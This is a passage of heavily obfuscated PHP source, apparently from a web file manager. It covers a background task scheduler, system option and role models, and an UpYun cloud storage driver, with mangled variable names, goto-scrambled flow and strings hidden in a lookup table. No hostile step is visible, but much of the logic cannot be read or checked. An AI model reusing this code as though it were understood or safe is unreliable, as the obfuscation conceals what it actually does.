(count($aŒåö™®Ï”) < $_SERVER[œº][589]) { $FŸ•Ê»Ñ®ğ = $_SERVER[œº][826]; $FŸ•Ê»Ñ®ğ(); } $F¢ÌÃïï = $_SERVER[œº][827]; goto D×óÚµ½ÅÙ; dëÑ»ñöË¦: $FÓ—º·öÂö = $_SERVER[œº][823]; $E¬º¹ğó ¼ = $_SERVER[$_SERVER[œº][824]] . $_SERVER[œº][825]; $DğÌ©Æœ…ã = $FÓ—º·öÂö($E¬º¹ğó ¼); goto Fåˆ±ß·Ó; D×óÚµ½ÅÙ: $F¢ÌÃïï($_SERVER[$_SERVER[œº][822]]); goto A­ÙñÊàª†; A­ÙñÊàª†: } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto fà™ß‹ƒóÂ; fà™ß‹ƒóÂ: $D¥Ö«Ñë§Õ =& $_SERVER[œº]; if (self::valueGet($D¥Ö«Ñë§Õ[710]) != $D¥Ö«Ñë§Õ[87]) { return; } if (self::valueGet($D¥Ö«Ñë§Õ[1492]) == $D¥Ö«Ñë§Õ[87]) { $A´ƒ•ê¾‚ = self::valueGet($D¥Ö«Ñë§Õ[1493]); if (time() - $A´ƒ•ê¾‚ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto Cêù¨‹Á²’; Dö‰ó²Ñ÷: while (!0) { self::cacheClear(); if (self::valueGet($D¥Ö«Ñë§Õ[710]) != $D¥Ö«Ñë§Õ[87]) { self::valueSet($D¥Ö«Ñë§Õ[1492], $D¥Ö«Ñë§Õ[191]); self::log($D¥Ö«Ñë§Õ[1496]); die; } self::valueSet($D¥Ö«Ñë§Õ[1492], $D¥Ö«Ñë§Õ[87]); self::valueSet($D¥Ö«Ñë§Õ[1493], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto A‰Ïµ×Ëë; Cêù¨‹Á²’: http_close(); self::valueSet($D¥Ö«Ñë§Õ[1492], $D¥Ö«Ñë§Õ[87]); Hook::bind($D¥Ö«Ñë§Õ[1494], $D¥Ö«Ñë§Õ[1495]); goto Dö‰ó²Ñ÷; A‰Ïµ×Ëë: } public static function restart() { $eÇê”ƒ´˜ =& $_SERVER[œº]; http_close(); self::valueSet($eÇê”ƒ´˜[710], $eÇê”ƒ´˜[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($eÇê”ƒ´˜[1492], $eÇê”ƒ´˜[191]); self::valueSet($eÇê”ƒ´˜[710], $eÇê”ƒ´˜[87]); } public static function shutdownEvent() { $Cƒ¦¦¡‡”ù =& $_SERVER[œº]; self::valueSet($Cƒ¦¦¡‡”ù[1492], $Cƒ¦¦¡‡”ù[191]); self::log($Cƒ¦¦¡‡”ù[1497]); } public static function config($BìóÛª‚», $Eà®¢Ë¼°¨) { self::valueSet($_SERVER[œº][710], $BìóÛª‚»); } private static function taskRunAll() { goto D¶±å¸Ôê¢; d˜à­äŠ: $b»‹ÒŒõ‡æ = count($B±ÛÆëõÇ); for ($d³†”ø‰ˆ¦ = 0; $d³†”ø‰ˆ¦ < $b»‹ÒŒõ‡æ; $d³†”ø‰ˆ¦++) { $A×Äİ êğ = $B±ÛÆëõÇ[$d³†”ø‰ˆ¦]; if (!$A×Äİ êğ[$DÉ¹ù¼à¡¸[393]] || $A×Äİ êğ[$DÉ¹ù¼à¡¸[1499]] != $DÉ¹ù¼à¡¸[87]) { continue; } if (!self::taskTimeCheck($A×Äİ êğ)) { continue; } self::taskRun($A×Äİ êğ); } Hook::trigger($DÉ¹ù¼à¡¸[1500]); goto f»ƒË÷”›ë; f»ƒË÷”›ë: self::taskQueueRun($A“ª¶ìŞùµ); self::closeDatabase(); goto F“š§¨‡é¥; D¶±å¸Ôê¢: $DÉ¹ù¼à¡¸ =& $_SERVER[œº]; $A“ª¶ìŞùµ = timeFloat(); $B±ÛÆëõÇ = Model($DÉ¹ù¼à¡¸[1498])->listData(); goto d˜à­äŠ; F“š§¨‡é¥: } private static function taskQueueRun($Bˆ ÷È·Ü) { $cİÀŞÌøí = 10; while (!0) { $aÌ—…ÛÄºË = TaskQueue::run(); if ($aÌ—…ÛÄºË === !1) { break; } if (timeFloat() - $Bˆ ÷È·Ü >= $cİÀŞÌøí) { break; } } } private static function taskTimeCheck($bÍã°ã°ƒÆ) { goto FÃ¹µÎå‘¶; fÏŞˆä†î§: switch ($bÏøË£¹§ˆ[$c›¶¸‹–ä[29]]) { case $c›¶¸‹–ä[1507]: if (time() - $bó…Õ±½‡ < 3600 * 24 * 30) { return !1; } if ($bÏøË£¹§ˆ[$c›¶¸‹–ä[1507]] == date($c›¶¸‹–ä[1508]) && $DãİóöÖ®Ş) { return !0; } break; case $c›¶¸‹–ä[1509]: if (time() - $bó…Õ±½‡ < 3600 * 24 * 7) { return !1; } $dŠùÃœäŠË = date($c›¶¸‹–ä[1510]) == 0 ? 7 : date($c›¶¸‹–ä[1510]); if ($bÏøË£¹§ˆ[$c›¶¸‹–ä[1509]] == $dŠùÃœäŠË && $DãİóöÖ®Ş) { return !0; } break; case $c›¶¸‹–ä[1502]: if (time() - $bó…Õ±½‡ < 3600 * 24) { return !1; } if ($DãİóöÖ®Ş) { return !0; } break; case $c›¶¸‹–ä[1511]: if (time() - $bó…Õ±½‡ >= floatval($bÏøË£¹§ˆ[$c›¶¸‹–ä[1511]]) * 60) { return !0; } break; default: break; } return !1; goto B¿»ÅĞĞÅô; FÃ¹µÎå‘¶: $c›¶¸‹–ä =& $_SERVER[œº]; $bÏøË£¹§ˆ = json_decode($bÍã°ã°ƒÆ[$c›¶¸‹–ä[197]], !0); $bó…Õ±½‡ = intval($bÍã°ã°ƒÆ[$c›¶¸‹–ä[1493]]); goto B°¤²¾¬¯; B°¤²¾¬¯: $A½Ù¥¸åœœ = strtotime($c›¶¸‹–ä[1501] . $bÏøË£¹§ˆ[$c›¶¸‹–ä[1502]] . $c›¶¸‹–ä[1503]) - strtotime($c›¶¸‹–ä[1504]); $E–ïî¤ø³ = time() - strtotime(date($c›¶¸‹–ä[1505]) . $c›¶¸‹–ä[1506]); $DãİóöÖ®Ş = $E–ïî¤ø³ >= $A½Ù¥¸åœœ && $E–ïî¤ø³ <= $A½Ù¥¸åœœ + 3600; goto fÏŞˆä†î§; B¿»ÅĞĞÅô: } private static function closeDatabase() { goto a¡¬ÊÄ¸ë…; dË¦›„¦õ‡: $C‚ùäëôœ = Model($EßÎ‡Ù¨Šˆ[502])->db($EßÎ‡Ù¨Šˆ[33]); if ($C‚ùäëôœ) { $C‚ùäëôœ->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($EßÎ‡Ù¨Šˆ[1512], $EßÎ‡Ù¨Šˆ[1513]); die; } goto aÀÂÙŸ·‡; a¡¬ÊÄ¸ë…: $EßÎ‡Ù¨Šˆ =& $_SERVER[œº]; static $A°İ½’–Ú™ = 0; $D´°»ØÀƒ– = 1800; goto aÊä¹š‘Ğ; aÊä¹š‘Ğ: if (!$A°İ½’–Ú™) { $A°İ½’–Ú™ = time(); } if (time() - $A°İ½’–Ú™ < $D´°»ØÀƒ–) { return; } $A°İ½’–Ú™ = time(); goto dË¦›„¦õ‡; aÀÂÙŸ·‡: } public static function taskRun($Eäºã±êà) { goto E„ ‡†Ó‹; C¦ùŒê‚: $F›ÔÃÂ’« = timeFloat(); $E¶¹«Ñ¡Çö = $Fëêˆ¨âÎ§[33]; switch ($Eäºã±êà[$Fëêˆ¨âÎ§[29]]) { case $Fëêˆ¨âÎ§[305]: $FµÚ¸æéµ‚ = url_request($Eäºã±êà[$Fëêˆ¨âÎ§[1517]], $Fëêˆ¨âÎ§[228], !1, !1, !1, !1, 10); if ($FµÚ¸æéµ‚[$Fëêˆ¨âÎ§[710]]) { $E¶¹«Ñ¡Çö = strlen($FµÚ¸æéµ‚[$Fëêˆ¨âÎ§[1088]]); } break; case $Fëêˆ¨âÎ§[227]: $E¶¹«Ñ¡Çö = Hook::apply($Eäºã±êà[$Fëêˆ¨âÎ§[1517]]); default: break; } goto e¨ô¯óÌØ¬; e¨ô¯óÌØ¬: Model($Fëêˆ¨âÎ§[1518])->add(array($Fëêˆ¨âÎ§[1519] => $Fëêˆ¨âÎ§[33], $Fëêˆ¨âÎ§[1520] => $Fëêˆ¨âÎ§[191], $Fëêˆ¨âÎ§[29] => $Fëêˆ¨âÎ§[1521] . $Eäºã±êà[$Fëêˆ¨âÎ§[393]], $Fëêˆ¨âÎ§[1522] => json_encode(array($Fëêˆ¨âÎ§[28] => $Eäºã±êà[$Fëêˆ¨âÎ§[28]], $Fëêˆ¨âÎ§[1523] => timeFloat() - $F›ÔÃÂ’«, $Fëêˆ¨âÎ§[291] => $E¶¹«Ñ¡Çö)))); self::log($Fëêˆ¨âÎ§[1524] . $Eäºã±êà[$Fëêˆ¨âÎ§[393]] . $Fëêˆ¨âÎ§[1525] . $E¶¹«Ñ¡Çö); return !0; goto e…‰ÒÑè„ù; E„ ‡†Ó‹: $Fëêˆ¨âÎ§ =& $_SERVER[œº]; self::log($Fëêˆ¨âÎ§[1514] . $Eäºã±êà[$Fëêˆ¨âÎ§[393]] . $Fëêˆ¨âÎ§[1515] . $Eäºã±êà[$Fëêˆ¨âÎ§[28]] . $Fëêˆ¨âÎ§[1516] . $Eäºã±êà[$Fëêˆ¨âÎ§[1517]]); Model($Fëêˆ¨âÎ§[1498])->run($Eäºã±êà[$Fëêˆ¨âÎ§[393]]); goto C¦ùŒê‚; e…‰ÒÑè„ù: } private static function valueGet($b÷Î–’ÆáÖ) { $CÇŠÁÙ…˜ =& $_SERVER[œº]; $e¼«ó‹÷Í‘ = $CÇŠÁÙ…˜[1526]; $bÉ¤œ³Ê§Ÿ = Model($CÇŠÁÙ…˜[1527])->get($b÷Î–’ÆáÖ, $e¼«ó‹÷Í‘); if (is_null($bÉ¤œ³Ê§Ÿ)) { Model($CÇŠÁÙ…˜[1527])->set($CÇŠÁÙ…˜[710], $CÇŠÁÙ…˜[87], $e¼«ó‹÷Í‘); Model($CÇŠÁÙ…˜[1527])->set($CÇŠÁÙ…˜[1492], $CÇŠÁÙ…˜[191], $e¼«ó‹÷Í‘); $bÉ¤œ³Ê§Ÿ = Model($CÇŠÁÙ…˜[1527])->get($b÷Î–’ÆáÖ, $e¼«ó‹÷Í‘); } return $bÉ¤œ³Ê§Ÿ; } private static function valueSet($A¹–£ŠË£™, $f’ŒÜŒä®©) { $Aµ…ŸÄÊ±È =& $_SERVER[œº]; return Model($Aµ…ŸÄÊ±È[1527])->set($A¹–£ŠË£™, $f’ŒÜŒä®©, $Aµ…ŸÄÊ±È[1526]); } protected static function log($C“‰ÙÉÙ‘Ø) { write_log($C“‰ÙÉÙ‘Ø, $_SERVER[œº][1513]); } private static function cacheClear() { $d™·™ô•à– =& $_SERVER[œº]; $B‚Üƒ¥ÓÈ” = Model($d™·™ô•à–[1527])->cacheKey($d™·™ô•à–[1526]); Cache::clearMemory($B‚Üƒ¥ÓÈ”); Model($d™·™ô•à–[1498])->cacheClear(); } } goto c‡·ëª¢‚×; E÷ÍÕÁˆÅø: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\137\157\160\164\x69\157\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\154\145", "\x72\157\154\145\107\162\157\165\x70", "\162\145\x67\x69\163\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($D×°…ÎÆ‘) { return "\123\171\163\164\x65\155\117\160\x74\151\x6f\156\x5f{$D×°…ÎÆ‘}"; } protected function optionDefault($D‹§ó…„á¶ = '') { $F‰£ß…œÜ× =& $_SERVER[œº]; if ($D‹§ó…„á¶ == $F‰£ß…œÜ×[33]) { return $GLOBALS[$F‰£ß…œÜ×[6]][$F‰£ß…œÜ×[378]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\162\x6f\x6c\145\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\x61\165\164\150", "\154\141\x62\145\154", "\144\x69\x73\160\154\141\x79", "\163\x79\x73\x74\x65\x6d", "\x64\145\163\x63", "\151\147\156\x6f\x72\145\105\x78\x74", "\x69\x67\156\157\162\x65\x46\x69\x6c\x65\123\x69\172\x65", "\x61\x64\155\x69\156\x69\x73\164\x72\x61\x74\x6f\x72", "\163\x6f\162\164"); public function listData($dî¹æÔ¾¥ = false, $fâï©ßÔ‹­ = "\x73\157\x72\164", $f‡ëØ’î‰ = false) { $aµâáÆÑ®ã =& $_SERVER[œº]; $dà„‡×ƒÆÁ = parent::listData($dî¹æÔ¾¥, $fâï©ßÔ‹­, $f‡ëØ’î‰); if (!$dî¹æÔ¾¥) { foreach ($dà„‡×ƒÆÁ as $E×Ï Æ£êğ => $DÅ™¦ƒâè©) { if ($DÅ™¦ƒâè©[$aµâáÆÑ®ã[1881]] == 1) { $dà„‡×ƒÆÁ[$E×Ï Æ£êğ][$aµâáÆÑ®ã[431]] = LNG($aµâáÆÑ®ã[2107]); } } } return $dà„‡×ƒÆÁ; } public function update($E †ÛÂ•Ç, $BæĞØ”…†) { goto dŞÅ¨êÑò; dŞÅ¨êÑò: $D¢™°×Ê÷ó =& $_SERVER[œº]; $AñàºéíÙã = parent::listData($E †ÛÂ•Ç); $F¥¥Â‚…§² = $this->findByName($BæĞØ”…†[$D¢™°×Ê÷ó[28]]); goto dãåßŞš‹Ù; dãåßŞš‹Ù: if (!$AñàºéíÙã || $F¥¥Â‚…§² && $F¥¥Â‚…§²[$D¢™°×Ê÷ó[393]] != $AñàºéíÙã[$D¢™°×Ê÷ó[393]]) { return !1; } if ($F¥¥Â‚…§²[$D¢™°×Ê÷ó[1881]] == 1) { $BæĞØ”…† = array($D¢™°×Ê÷ó[28] => $BæĞØ”…†[$D¢™°×Ê÷ó[28]], $D¢™°×Ê÷ó[1713] => $BæĞØ”…†[$D¢™°×Ê÷ó[1713]]); } $this->filterAuth($BæĞØ”…†[$D¢™°×Ê÷ó[406]]); goto EÜÍ‹†²Û; EÜÍ‹†²Û: return parent::update($E †ÛÂ•Ç, $BæĞØ”…†); goto e˜é³èµ•Õ; e˜é³èµ•Õ: } public function remove($Dê‡­‚ÏÔÁ) { $DæÓÔîÜÔÉ = parent::listData($Dê‡­‚ÏÔÁ); if (!$DæÓÔîÜÔÉ || $DæÓÔîÜÔÉ[$_SERVER[œº][1171]]) { return !1; } return parent::remove($Dê‡­‚ÏÔÁ); } public function add($A½˜¼œÓÏÑ) { goto B›èãµÒ–é; bö¶…ã‡ƒà: $AÏÖ—Ö¿‚Ó = array($CäˆÜÊĞÔ†[413] => $fîĞõ´Ãî…, $CäˆÜÊĞÔ†[1698] => $CäˆÜÊĞÔ†[33], $CäˆÜÊĞÔ†[1694] => $CäˆÜÊĞÔ†[1702], $CäˆÜÊĞÔ†[2108] => 1, $CäˆÜÊĞÔ†[1697] => 0, $CäˆÜÊĞÔ†[2109] => 0, $CäˆÜÊĞÔ†[1696] => $this->getSort()); $A½˜¼œÓÏÑ = array_merge($AÏÖ—Ö¿‚Ó, $A½˜¼œÓÏÑ); $this->filterAuth($A½˜¼œÓÏÑ[$CäˆÜÊĞÔ†[406]]); goto aÕí˜ó“ğø; B›èãµÒ–é: $CäˆÜÊĞÔ† =& $_SERVER[œº]; $fîĞõ´Ãî… = $A½˜¼œÓÏÑ[$CäˆÜÊĞÔ†[28]]; if ($this->findByName($fîĞõ´Ãî…)) { return !1; } goto bö¶…ã‡ƒà; aÕí˜ó“ğø: return parent::insert($A½˜¼œÓÏÑ); goto e‚ä±¸Û½¸; e‚ä±¸Û½¸: } private function getSort() { $A‘ÏÏ”îÓ =& $_SERVER[œº]; $f„ğ©ÈèíÒ = parent::listData(); $bŞùµµØğ  = array_to_keyvalue($f„ğ©ÈèíÒ, $A‘ÏÏ”îÓ[33], $A‘ÏÏ”îÓ[1715]); return empty($bŞùµµØğ ) ? 0 : max($bŞùµµØğ ) + 1; } private function filterAuth(&$dÃˆ ëƒ¥ä) { $FÜÚà…ø‹ =& $_SERVER[œº]; $FŠÕàØ‘ = array(); $a™à˜‹“ = array_filter(explode($FÜÚà…ø‹[47], $dÃˆ ëƒ¥ä)); foreach ($a™à˜‹“ as $dÃˆ ëƒ¥ä) { $C¡“õ˜„ö° = explode($FÜÚà…ø‹[95], $dÃˆ ëƒ¥ä); if ($C¡“õ˜„ö°[0] == $FÜÚà…ø‹[2110] && $C¡“õ˜„ö°[1] != $FÜÚà…ø‹[1090]) { $aæ†ò§’ÓÎ = $C¡“õ˜„ö°[0] . $FÜÚà…ø‹[95] . $C¡“õ˜„ö°[1] . $FÜÚà…ø‹[2111]; if (!in_array($aæ†ò§’ÓÎ, $a™à˜‹“)) { $FŠÕàØ‘[] = $aæ†ò§’ÓÎ; } } $FŠÕàØ‘[] = $dÃˆ ëƒ¥ä; } $dÃˆ ëƒ¥ä = implode($FÜÚà…ø‹[47], $FŠÕàØ‘); } public function sort($E…²‘øÃè, $cä¤´™Ú°) { return parent::update($E…²‘øÃè, $cä¤´™Ú°); } } goto A…ˆÜÁÒ˜; e˜Ãçª……õ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\57\x76\60\56\141\x70\x69\56\x75\160\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($D¿ïÇƒ“) { parent::__construct(); $this->_init($D¿ïÇƒ“); } public function _init($D·ö¶’µùª) { $DãÚÔ¥’”Õ =& $_SERVER[œº]; foreach ($D·ö¶’µùª as $eÂ×Êà­å => $dŸõ®Ø“§) { if (isset($this->{$eÂ×Êà­å})) { $this->{$eÂ×Êà­å} = $dŸõ®Ø“§; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($DãÚÔ¥’”Õ[1330] . LNG($DãÚÔ¥’”Õ[1262])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($c³ù¿Ó…ä‡, $bíƒÂ˜İÖŸ = "\x47\x45\124") { $dø¨¢¤ìÑò =& $_SERVER[œº]; $cöŒÉåØ¹ = gmdate($dø¨¢¤ìÑò[1296]); $CÆí­Ê¹× = base64_encode(hash_hmac($dø¨¢¤ìÑò[1331], "{$bíƒÂ˜İÖŸ}\46{$c³ù¿Ó…ä‡}\x26{$cöŒÉåØ¹}", md5("{$this->userpass}"), !0)); $d®±ˆÎ–… = array("\x41\x75\164\x68\x6f\162\x69\172\x61\164\x69\x6f\x6e\x3a\125\120\x59\x55\116\40{$this->username}\72{$CÆí­Ê¹×}", "\x44\x61\x74\x65\x3a{$cöŒÉåØ¹}"); return $d®±ˆÎ–…; } public function ussRequest($aùÓ…ä¡, $f«ÃÇØ‘‘” = "\107\105\x54", $eÌ–ÄÚÖÈÆ = false, $D†ÑÚ×•ùõ = false, $B©Ù©˜àÌÄ = false) { goto f¼Òóõ„Ğ™; dØÚ˜æĞ: if (!$b¾‘ßÁĞ²) { return array($fÄäÌ¢ƒÒĞ[1086] => !1, $fÄäÌ¢ƒÒĞ[1088] => $fÄäÌ¢ƒÒĞ[1332]); } if (strtolower($f«ÃÇØ‘‘”) == $fÄäÌ¢ƒÒĞ[190] || in_array($b¾‘ßÁĞ²[$fÄäÌ¢ƒÒĞ[1086]], array($fÄäÌ¢ƒÒĞ[1189], $fÄäÌ¢ƒÒĞ[1333]))) { $eÌ–ÄÚÖÈÆ = $b¾‘ßÁĞ²[$fÄäÌ¢ƒÒĞ[1334]]; } else { $eÌ–ÄÚÖÈÆ = json_decode($b¾‘ßÁĞ²[$fÄäÌ¢ƒÒĞ[1088]], !0); if (!$eÌ–ÄÚÖÈÆ) { $eÌ–ÄÚÖÈÆ = $b¾‘ßÁĞ²[$fÄäÌ¢ƒÒĞ[1088]]; } else { if (!$b¾‘ßÁĞ²[$fÄäÌ¢ƒÒĞ[710]] && isset($eÌ–ÄÚÖÈÆ[$fÄäÌ¢ƒÒĞ[1335]])) { $eÌ–ÄÚÖÈÆ = $eÌ–ÄÚÖÈÆ[$fÄäÌ¢ƒÒĞ[1335]]; } } } return array($fÄäÌ¢ƒÒĞ[1086] => $b¾‘ßÁĞ²[$fÄäÌ¢ƒÒĞ[710]], $fÄäÌ¢ƒÒĞ[1088] => $eÌ–ÄÚÖÈÆ); goto F¦Ü«»–¶; E‘Ï¼À³ƒ: $aŒùïøòµ‡ = $this->ussHeaders($Bª¬â³Ò“, $f«ÃÇØ‘‘”); if ($D†ÑÚ×•ùõ) { $aŒùïøòµ‡ = array_merge($aŒùïøòµ‡, $D†ÑÚ×•ùõ); } $b¾‘ßÁĞ² = url_request($this->endpoint . $Bª¬â³Ò“, $f«ÃÇØ‘‘”, $eÌ–ÄÚÖÈÆ, $aŒùïøòµ‡, $B©Ù©˜àÌÄ); goto dØÚ˜æĞ; f¼Òóõ„Ğ™: $fÄäÌ¢ƒÒĞ =& $_SERVER[œº]; $aùÓ…ä¡ = trim($aùÓ…ä¡, $fÄäÌ¢ƒÒĞ[8]); $Bª¬â³Ò“ = "\x2f{$this->bucket}\x2f{$aùÓ…ä¡}"; goto E‘Ï¼À³ƒ; F¦Ü«»–¶: } public function mkfile($B‚¢ÖñÌé“, $e¬·Øƒ¶Î = '', $CŠ¨·¸ò¹ = REPEAT_RENAME) { if ($this->setContent($B‚¢ÖñÌé“, $e¬·Øƒ¶Î)) { return $this->getPathOuter($B‚¢ÖñÌé“); } return !1; } public function mkdir($BÓ™ê¶‡÷ô, $DËç„ÒáÌ = REPEAT_SKIP) { $cëÕĞ°Ñ…ï =& $_SERVER[œº]; $cµÎ…ƒ†Ü = trim($BÓ™ê¶‡÷ô, $cëÕĞ°Ñ…ï[8]); if ($this->_isFolder($cµÎ…ƒ†Ü)) { return $this->getPathOuter($cµÎ…ƒ†Ü); } $d„õšÑÃÇÚ = array($cëÕĞ°Ñ…ï[1336]); $e»ñ²×ñ = $this->ussRequest($cµÎ…ƒ†Ü, $cëÕĞ°Ñ…ï[224], !1, $d„õšÑÃÇÚ); return $e»ñ²×ñ[$cëÕĞ°Ñ…ï[1086]] ? $this->getPathOuter($cµÎ…ƒ†Ü) : !1; } public function copyFile($BŸª‘ŸÛ, $c‰ À…åÃ±) { $dÄ‰†ì å =& $_SERVER[œº]; $cÜäòç¦íÓ = array($dÄ‰†ì å[1337] . "\57{$this->bucket}\x2f{$BŸª‘ŸÛ}", $dÄ‰†ì å[1338]); $dÂĞ´·‚Ù¯ = $this->ussRequest($c‰ À…åÃ±, $dÄ‰†ì å[226], !1, $cÜäòç¦íÓ); return $dÂĞ´·‚Ù¯[$dÄ‰†ì å[1086]] ? !0 : $this->getPathOuter($c‰ À…åÃ±); } public function moveFile($dÊ•…ÓÆĞ„, $A¾å„ŞØ) { $c“ß‡åğÜè =& $_SERVER[œº]; $B‚­ìµéŠ = array($c“ß‡åğÜè[1339] . "\x2f{$this->bucket}\57{$dÊ•…ÓÆĞ„}", $c“ß‡åğÜè[1338]); $f³å­å·â± = $this->ussRequest($A¾å„ŞØ, $c“ß‡åğÜè[226], !1, $B‚­ìµéŠ); return $f³å­å·â±[$c“ß‡åğÜè[1086]] ? !0 : $this->getPathOuter($A¾å„ŞØ); } public function delFile($Eåè¾œĞ) { $AçÙí¼Á° =& $_SERVER[œº]; $A¨‹”ù‚ × = $this->ussRequest($Eåè¾œĞ, $AçÙí¼Á°[1340]); return $A¨‹”ù‚ ×[$AçÙí¼Á°[1086]] ? !0 : !1; } public function delFolder($bÂö½¦ò¯Ä) { goto B©¸øİˆƒ„; FÅ’¤š±‡¶: $AÙÃğÎ—¾‹ = $c‚ÎíäÒ¦é = array(); $this->fileList($bÂö½¦ò¯Ä, $AÙÃğÎ—¾‹, $c‚ÎíäÒ¦é, !0); $this->listItemCache = !0; goto c’·ìÚ²©; B©¸øİˆƒ„: $bî…Ş‹Î¬ß =& $_SERVER[œº]; if (!$this->exist($bÂö½¦ò¯Ä)) { return !0; } $this->listItemCache = !1; goto FÅ’¤š±‡¶; c’·ìÚ²©: foreach ($c‚ÎíäÒ¦é as $EœÔğù…ŒÈ) { $FÜÓæÂ¨¯À = $this->ussRequest($EœÔğù…ŒÈ[$bî…Ş‹Î¬ß[28]], $bî…Ş‹Î¬ß[1340]); if (!$FÜÓæÂ¨¯À[$bî…Ş‹Î¬ß[1086]]) { return !1; } } foreach ($AÙÃğÎ—¾‹ as $b»ØŸÊìæ) { $FÜÓæÂ¨¯À = $this->ussRequest($b»ØŸÊìæ, $bî…Ş‹Î¬ß[1340]); if (!$FÜÓæÂ¨¯À[$bî…Ş‹Î¬ß[1086]]) { return !1; } } $FÜÓæÂ¨¯À = $this->ussRequest($bÂö½¦ò¯Ä, $bî…Ş‹Î¬ß[1340]); goto fóº‰°¥­æ; fóº‰°¥­æ: return $FÜÓæÂ¨¯À[$bî…Ş‹Î¬ß[1086]]; goto eßÛ¦³ â; eßÛ¦³ â: } public function rename($dÛ×†Ò·, $dÇšÜ‰Âß) { if ($this->isFile($dÛ×†Ò·)) { $dÇšÜ‰Âß = get_path_father($dÛ×†Ò·) . $dÇšÜ‰Âß; return $this->moveFile($dÛ×†Ò·, $dÇšÜ‰Âß); } return $this->renameObject($dÛ×†Ò·, $dÇšÜ‰Âß); } public function fileInfo($A±’³ÁÍĞ, $CÅ¯áŠä›§ = false, $cÒÃ–¹š×ö = array()) { goto bŸ«ãËÑßŠ; bŸ«ãËÑßŠ: $a•ËòóÑ†ã =& $_SERVER[œº]; $FÒ½˜·ƒÜÈ = array($a•ËòóÑ†ã[28] => $this->pathThis($A±’³ÁÍĞ), $a•ËòóÑ†ã[76] => $this->getPathOuter($a•ËòóÑ†ã[8] . $A±’³ÁÍĞ), $a•ËòóÑ†ã[29] => $a•ËòóÑ†ã[193], $a•ËòóÑ†ã[78] => isset($cÒÃ–¹š×ö[$a•ËòóÑ†ã[78]]) ? $cÒÃ–¹š×ö[$a•ËòóÑ†ã[78]] : 0, $a•ËòóÑ†ã[168] => $this->ext($A±’³ÁÍĞ)); if ($CÅ¯áŠä›§) { return $FÒ½˜·ƒÜÈ; } goto cá‡øÀÖÌ; bĞ¡ ¯Û÷: $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[194]] = intval($cÒÃ–¹š×ö[$a•ËòóÑ†ã[1341]]); $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[84]] = intval($cÒÃ–¹š×ö[$a•ËòóÑ†ã[1342]]); $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[78]] = $cÒÃ–¹š×ö[$a•ËòóÑ†ã[78]]; goto FƒÚ·Ò­«; FƒÚ·Ò­«: return $FÒ½˜·ƒÜÈ; goto aæ¾¼ÚŞî…; cá‡øÀÖÌ: $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[194]] = $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[84]] = 0; $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[195]] = $FÒ½˜·ƒÜÈ[$a•ËòóÑ†ã[196]] = !0; if (empty($cÒÃ–¹š×ö)) { $cÒÃ–¹š×ö = $this->objectMeta($A±’³ÁÍĞ); if (!$cÒÃ–¹š×ö) { return $FÒ½˜·ƒÜÈ; } } goto bĞ¡ ¯Û÷; aæ¾¼ÚŞî…: } public function folderInfo($d±‡‚Á®®, $bó‘£‰Ó÷× = false) { goto bÂÑğ§”¯; eÕº‡ˆ½æ¤: $e†ê£ÑÜ[$d“³¼é²›[194]] = $e†ê£ÑÜ[$d“³¼é²›[84]] = 0; $e†ê£ÑÜ[$d“³¼é²›[195]] = $e†ê£ÑÜ[$d“³¼é²›[196]] = !0; if (empty($e…İ™®í¡)) { $e…İ™®í¡ = $this->objectMeta($d±‡‚Á®®); if (!$e…İ™®í¡) { return $e†ê£ÑÜ; } } goto EÌ¿Š¿÷Ï; bÂÑğ§”¯: $d“³¼é²› =& $_SERVER[œº]; $e†ê£ÑÜ = array($d“³¼é²›[28] => $this->pathThis($d±‡‚Á®®), $d“³¼é²›[76] => $this->getPathOuter($d“³¼é²›[8] . $d±‡‚Á®®), $d“³¼é²›[29] => $d“³¼é²›[77]); if ($bó‘£‰Ó÷×) { return $e†ê£ÑÜ; } goto eÕº‡ˆ½æ¤; EÌ¿Š¿÷Ï: $e†ê£ÑÜ[$d“³¼é²›[194]] = intval($e…İ™®í¡[$d“³¼é²›[1341]]); $e†ê£ÑÜ[$d“³¼é²›[84]] = intval($e…İ™®í¡[$d“³¼é²›[1342]]); return $e†ê£ÑÜ; goto BŒšÀùÇË; BŒšÀùÇË: } private function listObjs($dÂœ¤ßùó‘, $DõÛíö¾• = 0, $eÈ¤”·â½ = 1000) { $BÕ÷´Ï—ê´ =& $_SERVER[œº]; $aÕ¤—Ş = array($BÕ÷´Ï—ê´[1343], $BÕ÷´Ï—ê´[1344] . $eÈ¤”·â½); if ($DõÛíö¾•) { $aÕ¤—Ş[] = $BÕ÷´Ï—ê´[1345] . $DõÛíö¾•; } $F¤ì§­š— = $this->ussRequest($dÂœ¤ßùó‘, $BÕ÷´Ï—ê´[228], !1, $aÕ¤—Ş); return !$F¤ì§­š—[$BÕ÷´Ï—ê´[1086]] ? !1 : $F¤ì§­š—[$BÕ÷´Ï—ê´[1088]]; } private function fileList($aô²îãË‰¥, &$bóœÊùÂ§, &$F¿Œ…ÖÊİ, $e÷ï¬Ãë±‡ = false) { goto dÈ½ÈÚÂÊ®; dÈ½ÈÚÂÊ®: $e³²†ŸãÁ£ =& $_SERVER[œº]; 